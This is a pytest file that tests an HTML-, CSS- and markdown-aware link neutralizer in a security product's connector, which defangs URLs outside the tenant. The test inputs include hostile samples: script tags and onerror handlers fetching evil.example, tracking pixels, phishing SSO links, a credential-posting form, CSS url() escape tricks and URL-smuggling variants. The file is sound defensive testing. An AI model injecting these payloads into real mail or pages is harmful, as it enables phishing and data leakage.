# /// script
# requires-python = ">=3.11"
# dependencies = ["pytest>=8.0"]
# ///
# Copyright 2026 Exabeam, Inc.
# SPDX-License-Identifier: Apache-2.0
"""The HTML-aware link pass and the tenant allowlist (#147, decided 2026-09-05: "clickable is decided by
destination, not authorship"), plus the markdown link forms from #119. Every test asserts the specific
transformation AND that the surrounding bytes are untouched, so a deleted branch fails loudly (#120).

Run:  uv run --with pytest pytest -q tests/test_neutralize_html.py
"""
import importlib.util
import json
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("neutralize_output", ROOT / "plugin" / "connector" / "neutralize_output.py")
N = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(N)

MCP_URL = "https://api.us-west.exabeam.cloud/mcp"
T = N.tenant_hosts_from_url(MCP_URL)           # the operator's own tenant
NONE = frozenset()

def neut(text, allowed=T, mail=False):
    return N.neutralize_output(text, allowed_hosts=allowed, mail=mail)


# ---- the allowlist is derived, never curated -------------------------------------------------------------

def test_tenant_hosts_are_derived_from_the_mcp_url_and_nothing_else():
    assert T == frozenset({"api.us-west.exabeam.cloud", "*.us-west.exabeam.cloud"})
    assert N.tenant_hosts_from_url("") == frozenset()
    assert N.tenant_hosts_from_url("not a url") == frozenset()
    assert N.tenant_hosts_from_url("https://exabeam.cloud/mcp") == frozenset({"exabeam.cloud"}), "no region label -> exact host only"
    assert N.tenant_hosts_from_url("https://10.0.0.1/mcp") == frozenset({"10.0.0.1"}), "an IP literal never widens"
    assert N.tenant_hosts_from_url("HTTPS://API.US-WEST.EXABEAM.CLOUD./mcp") == T, "case and trailing dot normalized"


@pytest.mark.parametrize("host,ok", [
    ("api.us-west.exabeam.cloud", True), ("us-west.exabeam.cloud", True), ("console.us-west.exabeam.cloud", True),
    ("API.US-WEST.EXABEAM.CLOUD", True),
    ("api.eu.exabeam.cloud", False),                       # another region is not this tenant
    ("us-west.exabeam.cloud.evil.example", False),         # suffix in the middle
    ("evilus-west.exabeam.cloud", False),                  # no dot boundary
    ("exabeam.cloud", False), ("evil.example", False), ("", False),
])
def test_is_allowed_host_boundaries(host, ok):
    assert N.is_allowed_host(host, T) is ok


@pytest.mark.parametrize("url,ok", [
    ("https://api.us-west.exabeam.cloud/cases/4471", True),
    ("HTTPS://Console.US-WEST.exabeam.cloud/", True),
    ("//us-west.exabeam.cloud/x", True),                                   # protocol-relative
    ("https://us-west.exabeam.cloud:8443/x", True),
    ("https://api.us-west.exabeam.cloud@evil.example/", False),           # userinfo trick
    ("https://evil.example\\@api.us-west.exabeam.cloud/", False),          # backslash smuggling
    ("https://api.us-west.exabeam.cloud/x y", False),                     # whitespace
    ("https://api.us-west.exabeam.cloud/x\x00", False),
    ("mailto:someone@us-west.exabeam.cloud", False),                       # not http(s)
    ("javascript:alert(1)", False), ("ftp://us-west.exabeam.cloud/x", False),
    ("https://evil.example/?next=https://api.us-west.exabeam.cloud", False),
])
def test_url_allowed_only_for_http_into_the_tenant(url, ok):
    assert N._url_allowed(url, T) is ok
    assert N._url_allowed(url, NONE) is False, "an empty allowlist keeps nothing live"


# ---- HTML: links, fetches, handlers, executing elements ---------------------------------------------------

def test_html_anchor_to_attacker_is_defanged_and_tenant_anchor_stays_byte_identical():
    raw = ('<p style="margin:0;">See <a href="https://us-west.exabeam.cloud/cases/4471">case 4471</a> and '
           '<a href="https://sso-reset.evil.example/login?u=r.haddad">reset SSO</a>.</p>')
    out, notes = neut(raw)
    assert '<a href="https://us-west.exabeam.cloud/cases/4471">case 4471</a>' in out
    assert 'href="hxxps://sso-reset[.]evil[.]example/login?u=r.haddad"' in out
    assert "https://sso-reset.evil.example" not in out
    assert out.startswith('<p style="margin:0;">See ') and out.endswith(".</p>")
    assert [n["type"] for n in notes] == ["html_link"]


def test_with_no_allowlist_even_the_tenant_link_is_defanged():
    out, _ = neut('<a href="https://us-west.exabeam.cloud/cases/1">x</a>', allowed=NONE)
    assert 'href="hxxps://us-west[.]exabeam[.]cloud/cases/1"' in out


def test_tracking_pixel_src_is_defanged():
    out, notes = neut('<img src="https://attacker.example/t.gif?u=r.haddad" width="1" height="1"/>')
    assert 'src="hxxps://attacker[.]example/t.gif?u=r.haddad" width="1" height="1"/>' in out
    assert notes[0]["type"] == "html_src"


@pytest.mark.parametrize("raw,gone,present", [
    ('<a href="javascript:alert(1)">x</a>', "javascript:", "javascript[:]"),
    ('<a HREF="JAVASCRIPT:alert(1)">x</a>', "JAVASCRIPT:", "JAVASCRIPT[:]"),
    ('<a href="&#106;avascript:alert(1)">x</a>', "javascript:", "javascript[:]"),            # entity-encoded j
    ('<a href="java&#9;script:alert(1)">x</a>', "script:alert", "javascript[:]alert(1)"),     # entity tab inside the scheme
    ('<a href="java\tscript:alert(1)">x</a>', "java\tscript", "javascript[:]"),               # raw tab
    ('<a href="\n  javascript:alert(1)">x</a>', "javascript:", "javascript[:]"),
    ('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', "data:text", "data[:]text"),
    ('<a href="vbscript:msgbox(1)">x</a>', "vbscript:", "vbscript[:]"),
    ('<a href="mailto:ceo@example.com">x</a>', "mailto:", "mailto[:]"),
    ('<a href="tel:+15555550100">x</a>', "tel:", "tel[:]"),
    ("<a href='https://evil.example/x'>x</a>", "https://evil.example", "hxxps://evil[.]example/x"),
    ("<a href=https://evil.example/x>x</a>", "https://evil.example", "hxxps://evil[.]example/x"),           # unquoted
    ("<a/href=https://evil.example/x>x</a>", "https://evil.example", "hxxps://evil[.]example/x"),           # slash as separator
    ('<a href="//evil.example/x">x</a>', "//evil.example", "//evil[.]example/x"),                           # protocol-relative
    ('<a href="www.evil.example/x">x</a>', "www.evil.example", "www[.]evil[.]example/x"),
    ('<a href="  https://evil.example  ">x</a>', "https://evil.example", "hxxps://evil[.]example"),
])
def test_dangerous_and_foreign_targets_in_href_are_defanged(raw, gone, present):
    out, _ = neut(raw)
    assert gone not in out, out
    assert present in out, out
    assert out.startswith("<a") and out.endswith(">x</a>")


@pytest.mark.parametrize("attr", ["src", "action", "formaction", "poster", "background", "ping", "cite", "longdesc", "xlink:href", "dynsrc", "lowsrc", "codebase"])
def test_every_url_bearing_attribute_is_covered(attr):
    out, _ = neut(f'<x {attr}="https://evil.example/f">y</x>')
    assert f'{attr}="hxxps://evil[.]example/f"' in out


def test_relative_paths_and_fragments_are_left_alone():
    raw = '<a href="#top">top</a> <a href="/cases/1">c</a> <img src="cid:logo"/> <a href="cases/1">r</a>'
    out, notes = neut(raw)
    assert out == raw.replace('src="cid:logo"', 'src="cid[:]logo"'), "a scheme that is not http(s) is defanged, paths/fragments are not"


def test_srcset_candidates_are_each_decided():
    raw = '<img srcset="https://us-west.exabeam.cloud/l.png 1x, https://attacker.example/t.png 2x" src="/local.png">'
    out, _ = neut(raw)
    assert 'srcset="https://us-west.exabeam.cloud/l.png 1x, hxxps://attacker[.]example/t.png 2x"' in out
    assert 'src="/local.png"' in out


@pytest.mark.parametrize("raw,gone", [
    ('<img src="x" onerror="fetch(\'https://evil.example\')">', "onerror"),
    ("<img src=x onerror=alert(1)>", "onerror"),
    ('<body onload="x()">', "onload"),
    ('<a href="#" onmouseover=\'x()\' ONCLICK="y()">z</a>', "onmouseover"),
    ("<div/onclick=x()>", "onclick"),
])
def test_event_handlers_are_removed(raw, gone):
    out, notes = neut(raw)
    assert gone.lower() not in out.lower()
    assert any(n["type"] == "html_handler" for n in notes)


def test_handler_removal_keeps_the_other_attributes_byte_identical():
    out, _ = neut('<td bgcolor="#f7f9fc" style="padding:12px 18px;" onclick="x()">v</td>')
    assert out == '<td bgcolor="#f7f9fc" style="padding:12px 18px;">v</td>'


@pytest.mark.parametrize("raw", [
    "<script>fetch('https://evil.example')</script>",
    "<SCRIPT src=https://evil.example/x.js></SCRIPT>",
    '<iframe src="https://evil.example/"></iframe>',
    "<object data='https://evil.example/x.swf'></object>",
    "<svg onload=alert(1)><a xlink:href='https://evil.example'>x</a></svg>",
    "<embed src=https://evil.example/x></embed>",
])
def test_executing_elements_are_removed_with_their_content(raw):
    out, notes = neut("before " + raw + " after")
    assert out == "before  after", out
    assert notes and notes[0]["type"] == "html_strip"


def test_an_unclosed_script_tag_is_made_inert_not_reasoned_about():
    out, _ = neut("x <script>alert(1) y")
    assert out == "x &lt;script>alert(1) y"


@pytest.mark.parametrize("raw,inert", [
    ('<form action="https://evil.example/steal"><input name=pw></form>', "&lt;form"),
    ('<meta http-equiv="refresh" content="0;url=https://evil.example">', "&lt;meta"),
    ('<base href="https://evil.example/">', "&lt;base"),
    ('<link rel=stylesheet href="https://evil.example/x.css">', "&lt;link"),
])
def test_navigation_and_form_tags_are_made_inert_in_place(raw, inert):
    out, _ = neut(raw)
    assert out.startswith(inert), out
    assert "<form" not in out and "<meta" not in out and "<base" not in out and "<link" not in out


def test_form_inner_content_survives_only_the_tags_are_neutralized():
    out, _ = neut('<form action="https://evil.example"><p>keep me</p></form>')
    assert "<p>keep me</p>" in out and out.count("&lt;") == 2


@pytest.mark.parametrize("raw,present", [
    ('<div style="background:url(https://evil.example/x.png)">', "url(hxxps://evil[.]example/x.png)"),
    ("<div style=\"background: url( 'https://evil.example/x.png' )\">", "url( 'hxxps://evil[.]example/x.png' )"),
    ('<div style="width:expression(alert(1))">', "expression[(]alert(1))"),
    ("<style>@import 'https://evil.example/x.css'; .a{background:url(https://evil.example/y)}</style>", "@import 'hxxps://evil[.]example/x.css'"),
])
def test_css_fetch_vectors_are_defanged(raw, present):
    out, _ = neut(raw)
    assert present in out, out


def test_css_url_into_the_tenant_stays():
    raw = '<div style="background:url(https://us-west.exabeam.cloud/logo.png)">'
    assert neut(raw)[0] == raw


def test_srcdoc_is_dropped_it_is_an_iframe_by_another_name():
    out, _ = neut('<iframe srcdoc="<script>x()</script>"></iframe>')
    assert out == ""
    out, _ = neut('<x srcdoc="<b>y</b>">')          # on a non-iframe tag too
    assert "srcdoc" not in out


def test_quoted_gt_inside_an_attribute_does_not_end_the_tag():
    out, _ = neut('<a title="a > b" href="https://evil.example/x">y</a>')
    assert 'title="a > b" href="hxxps://evil[.]example/x"' in out


def test_userinfo_trick_in_html_href_is_defanged():
    out, _ = neut('<a href="https://api.us-west.exabeam.cloud@evil.example/">x</a>')
    assert "evil[.]example" in out and "https://api.us-west.exabeam.cloud@evil.example" not in out


def test_raw_html_anchor_in_a_case_note_is_defanged_too():
    """#119 item 3: mail mode is not required — an anchor in a markdown note renders live as well."""
    out, _ = neut('Evidence: <a href="https://sso-reset.evil.example/login">reset</a>', mail=False)
    assert 'href="hxxps://sso-reset[.]evil[.]example/login"' in out


# ---- mail mode: bare URLs are clickable in a mail client ---------------------------------------------------

def test_mail_mode_defangs_bare_urls_in_text_except_the_tenant():
    raw = "<p>Open https://us-west.exabeam.cloud/cases/4471 — not https://sso-reset.evil.example/login.</p>"
    out, notes = neut(raw, mail=True)
    assert "https://us-west.exabeam.cloud/cases/4471" in out
    assert "hxxps://sso-reset[.]evil[.]example/login" in out and "https://sso-reset.evil.example" not in out
    assert any(n["type"] == "mail_url" for n in notes)


def test_mail_mode_sees_through_entity_encoded_bare_urls():
    out, _ = neut("<p>https&#58;&#47;&#47;evil.example/x</p>", mail=True)
    assert "hxxps://evil[.]example/x" in out


def test_note_mode_leaves_bare_urls_alone_the_documented_residual():
    raw = "see https://evil.example/x for the IOC"
    assert neut(raw, mail=False)[0] == raw


def test_mail_mode_does_not_touch_text_without_urls():
    raw = "<p style=\"margin:0 0 16px;color:#4a5568;\">3 cases &amp; 2 alerts &mdash; &lt;critical&gt;</p>"
    assert neut(raw, mail=True)[0] == raw


# ---- markdown: the #119 forms -----------------------------------------------------------------------------

@pytest.mark.parametrize("raw,present", [
    ('[t](https://sso-reset.evil.example/login "title")', '[t](hxxps://sso-reset[.]evil[.]example/login "title")'),
    ("[t]( https://sso-reset.evil.example/login)", "[t]( hxxps://sso-reset[.]evil[.]example/login)"),
    ("[t](https://sso-reset.evil.example/login )", "[t](hxxps://sso-reset[.]evil[.]example/login )"),
    ("[see [1]](https://sso-reset.evil.example/login)", "[see [1]](hxxps://sso-reset[.]evil[.]example/login)"),
    ('![img](https://sso-reset.evil.example/login "t")', '![img](hxxps://sso-reset[.]evil[.]example/login "t")'),
    ("[t](<https://sso-reset.evil.example/login>)", "[t](<hxxps://sso-reset[.]evil[.]example/login>)"),
    ("[t][ref]\n\n[ref]: https://sso-reset.evil.example/login", "[ref]: hxxps://sso-reset[.]evil[.]example/login"),
    ("  [ref]: <https://sso-reset.evil.example/login> 'title'", "  [ref]: <hxxps://sso-reset[.]evil[.]example/login> 'title'"),
    ("<https://sso-reset.evil.example/login>", "<hxxps://sso-reset[.]evil[.]example/login>"),
    ("<www.sso-reset.evil.example/login>", "<www[.]sso-reset[.]evil[.]example/login>"),
    ("[t](https://evil.example/a(b)c)", "[t](hxxps://evil[.]example/a(b)c)"),                     # balanced parens in the target
])
def test_every_markdown_link_form_is_defanged(raw, present):
    out, notes = neut(raw)
    assert present in out, out
    assert "sso-reset.evil.example" not in out and "https://evil.example" not in out
    assert any(n["type"] == "link" for n in notes)


def test_markdown_link_into_the_tenant_stays_live_in_a_note():
    raw = "Worked [case 4471](https://us-west.exabeam.cloud/cases/4471) and <https://api.us-west.exabeam.cloud/x>."
    assert neut(raw)[0] == raw


def test_formula_line_no_longer_kills_the_tenant_link():
    raw = '=HYPERLINK("https://evil.example","x") see https://us-west.exabeam.cloud/cases/1 and https://evil.example/y'
    out, _ = neut(raw)
    assert out.startswith("'=HYPERLINK(\"hxxps://evil[.]example\"")
    assert "https://us-west.exabeam.cloud/cases/1" in out and "hxxps://evil[.]example/y" in out


# ---- do no harm: the real mail template -------------------------------------------------------------------

MAIL_TEMPLATE = """<h2 style="color:#0f2744;font-size:20px;font-weight:800;margin:0 0 14px;line-height:1.3;">Case Details &mdash; CASE-4471</h2>
<p style="margin:0 0 16px;color:#4a5568;font-size:14px;line-height:1.75;">3 cases were found in the last 24 hours &amp; 1 is CRITICAL. Recommend escalation to Tier 2. <a href="https://us-west.exabeam.cloud/cases/4471">Open case 4471</a>.</p>
<table style="border-collapse:collapse;width:100%;margin:0 0 26px;">
  <thead>
    <tr>
      <th bgcolor="#0f2744" style="background-color:#0f2744;color:#ffffff;padding:12px 18px;text-align:left;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">Case ID</th>
      <th bgcolor="#0f2744" style="background-color:#0f2744;color:#ffffff;padding:12px 18px;text-align:left;font-size:11px;">Priority</th>
    </tr>
  </thead>
  <tbody>
    <tr bgcolor="#f7f9fc"><td style="background-color:#f7f9fc;padding:12px 18px;font-size:14px;color:#374151;border-bottom:1px solid #e8ecf4;vertical-align:middle;">CASE-4471</td><td style="background-color:#f7f9fc;padding:12px 18px;"><span class="badge badge-critical" style="display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;letter-spacing:0.4px;text-transform:uppercase;background-color:#fdecea;color:#b71c1c;">CRITICAL</span></td></tr>
    <tr bgcolor="#ffffff"><td style="background-color:#ffffff;padding:12px 18px;border-bottom:none;">CASE-4472 &lt;pending&gt;</td><td style="padding:12px 18px;">+45 (approx) @user -unassigned- =99 &mdash; 2026-09-05T20:17:50Z</td></tr>
  </tbody>
</table>
<ul style="margin:0 0 20px;padding-left:22px;color:#4a5568;font-size:14px;line-height:1.85;"><li style="margin-bottom:5px;">Rotate the svc-backup credential.</li><li style="margin-bottom:5px;">Verify CHG-2026-5102 in the console: https://console.us-west.exabeam.cloud/changes/5102</li></ul>
<p style="margin:0 0 16px;color:#4a5568;font-size:14px;">Showing top 10 of 47 results.</p>
"""

def test_the_mail_template_with_tenant_links_is_byte_identical_in_mail_mode():
    out, notes = neut(MAIL_TEMPLATE, mail=True)
    assert out == MAIL_TEMPLATE
    assert notes == []


def test_the_mail_template_with_no_allowlist_changes_only_the_two_tenant_links():
    out, notes = neut(MAIL_TEMPLATE, allowed=NONE, mail=True)
    expected = (MAIL_TEMPLATE
                .replace('href="https://us-west.exabeam.cloud/cases/4471"', 'href="hxxps://us-west[.]exabeam[.]cloud/cases/4471"')
                .replace("https://console.us-west.exabeam.cloud/changes/5102", "hxxps://console[.]us-west[.]exabeam[.]cloud/changes/5102"))
    assert out == expected
    assert sorted(n["type"] for n in notes) == ["html_link", "mail_url"]


def test_planted_content_in_the_template_is_neutralized_and_nothing_else_moves():
    planted = MAIL_TEMPLATE.replace("Rotate the svc-backup credential.",
                                    'Rotate: <a href="https://sso-reset.evil.example/login">reset here</a> <img src="https://attacker.example/t.gif" width="1"> https://evil.example/ioc')
    out, notes = neut(planted, mail=True)
    assert 'href="hxxps://sso-reset[.]evil[.]example/login"' in out and 'src="hxxps://attacker[.]example/t.gif"' in out
    assert "hxxps://evil[.]example/ioc" in out
    assert out.replace('hxxps://sso-reset[.]evil[.]example/login', 'https://sso-reset.evil.example/login') \
              .replace('hxxps://attacker[.]example/t.gif', 'https://attacker.example/t.gif') \
              .replace('hxxps://evil[.]example/ioc', 'https://evil.example/ioc') == planted, "only the three planted targets changed"
    assert sorted(n["type"] for n in notes) == ["html_link", "html_src", "mail_url"]


@pytest.mark.parametrize("raw", [
    MAIL_TEMPLATE,
    '<a href="https://sso-reset.evil.example/login" onclick="x()">r</a><script>y()</script><img src="https://attacker.example/t.gif">',
    "[t](https://evil.example/x \"t\")\n\n[ref]: https://evil.example/y\n<https://evil.example/z>",
    '<div style="background:url(https://evil.example/x)">java&#9;script: <a href="java\tscript:alert(1)">x</a></div>',
])
def test_idempotent_in_both_modes(raw):
    for mail in (False, True):
        once, _ = neut(raw, mail=mail)
        twice, notes = neut(once, mail=mail)
        assert twice == once
        assert notes == [] or all(n["type"] not in ("html_link", "html_src", "html_handler", "html_strip") for n in notes), notes


def test_the_existing_markdown_corpus_is_unchanged_by_the_html_pass():
    """Regression guard: prose that merely CONTAINS angle brackets or the word 'href' is not HTML."""
    for raw in ["latency < 5 ms and > 2 ms", "a <b> c", "compare x<y>z", "the href attribute is documented", "<not a tag", "3 > 2"]:
        assert neut(raw)[0] == raw, raw


@pytest.mark.parametrize("raw", [
    "[a [b [c]]](https://sso-reset.evil.example/login)",                 # three levels of brackets in the text
    "[ref]:\n  https://sso-reset.evil.example/login",                    # destination on the next line
    "[t](https://sso-reset.evil.example/login 'single' )",
    "[t](<https://sso-reset.evil.example/login> (paren title))",
])
def test_markdown_edge_forms_are_defanged(raw):
    out, _ = neut(raw)
    assert "sso-reset.evil.example" not in out and "sso-reset[.]evil[.]example" in out, out


@pytest.mark.parametrize("raw,present", [
    ('<a href="https:evil.example/x">x</a>', 'href="hxxps://evil[.]example/x"'),          # browsers repair the slashes
    ('<a href="https:/evil.example/x">x</a>', 'href="hxxps://evil[.]example/x"'),
    ('<a href="HTTPS:evil.example/x">x</a>', 'href="hxxpS://evil[.]example/x"'),
    ("[t](https:evil.example/x)", "[t](hxxps://evil[.]example/x)"),
    ("<p>https:/evil.example/x</p>", "hxxps://evil[.]example/x"),
])
def test_slashless_special_schemes_are_repaired_then_defanged(raw, present):
    out, _ = neut(raw, mail=True)
    assert present in out, out
    assert "evil.example" not in out.replace("evil[.]example", "")


def test_slashless_repair_does_not_touch_prose_ratios_or_times():
    for raw in ["ratio https:2 ok", "at 10:30 https: later", "the https:// scheme", "port 443:", "key:value"]:
        assert neut(raw)[0] == raw, raw


# ---- review round 1 findings (2026-09-05) ------------------------------------------------------------------

def test_unbalanced_quote_in_a_url_attribute_cannot_smuggle_a_live_fetch():
    """An HTML5 tokenizer runs a double-quoted value on to the NEXT quote in the document, swallowing the
    '>' -- so this is a live <img src="https://evil.example/beacon?...> fetch with the rest of the mail in
    its query string. The opener must become text."""
    raw = '<p>hi</p><img src="https://evil.example/beacon?id=1><p>host "acme"</p>'
    out, notes = neut(raw, mail=True)
    assert out.startswith('<p>hi</p>&lt;img src="hxxps://evil[.]example/beacon?id=1><p>host "acme"</p>') or \
           (out.startswith('<p>hi</p>&lt;img') and "https://evil.example" not in out), out
    assert "<img" not in out
    for quote in ('"', "'"):
        raw = f"<a href={quote}https://evil.example/x>click</a>"
        out, _ = neut(raw, mail=True)
        assert "<a href" not in out and "https://evil.example" not in out, out
    # note mode: the opener is inert even though bare URLs in a note are the residual
    out, _ = neut('<img src="https://evil.example/beacon?id=1><p>host "acme"</p>', mail=False)
    assert out.startswith("&lt;img")


def test_well_formed_tags_with_balanced_quotes_are_not_escaped():
    raw = '<td title="a > b" style="color:#374151;">x</td> <a href="https://us-west.exabeam.cloud/c/1">y</a> <not a tag'
    assert neut(raw)[0] == raw


@pytest.mark.parametrize("raw", [
    "[a[b[c[d[e]]]]](https://evil.example)",              # five levels of brackets in the text
    "[a[b[c[d[e[f[g]]]]]]](https://evil.example/x)",
    "[x](https://evil.example/a(b(c)))",                   # nested balanced parens in the destination
    "[x](https://evil.example/a(b(c(d))) \"t\")",
    "![i[m[g]]](https://evil.example/p(1))",
])
def test_markdown_links_of_any_depth_are_defanged(raw):
    out, notes = neut(raw)
    assert "https://evil.example" not in out and "hxxps://evil[.]example" in out, out
    assert notes and notes[0]["type"] == "link"


def test_markdown_scanner_does_not_touch_non_links():
    for raw in ["a](b", "x](https://us-west.exabeam.cloud/c) y", "[t](https://evil.example", "call f(a](b)) now", "[t]( )"]:
        out, _ = neut(raw)
        assert out == raw or "evil.example" not in raw, raw


@pytest.mark.parametrize("raw,present", [
    ('<div style="background:\\75rl(//evil.example/x.png)">x</div>', "url(//evil[.]example/x.png)"),
    ('<div style="background:\\75 rl(https://evil.example/x.png)">x</div>', "url(hxxps://evil[.]example/x.png)"),
    ("<style>.a{background:\\75rl('https://evil.example/y')}</style>", "url('hxxps://evil[.]example/y')"),
    ('<div style="background:image-set(\'https://evil.example/x.png\' 1x)">x</div>', "image-set('hxxps://evil[.]example/x.png' 1x)"),
    ("<div style='background:-webkit-image-set(\"https://evil.example/x.png\" 1x)'>x</div>", 'image-set("hxxps://evil[.]example/x.png" 1x)'),
])
def test_css_escapes_and_image_set_are_covered(raw, present):
    out, _ = neut(raw, mail=True)
    assert present in out, out


def test_ordinary_css_escapes_are_left_alone():
    raw = '<span style="font-family:\\5FAE\\8F6F\\96C5\\9ED1;content:\\201C">q</span>'
    assert neut(raw, mail=True)[0] == raw
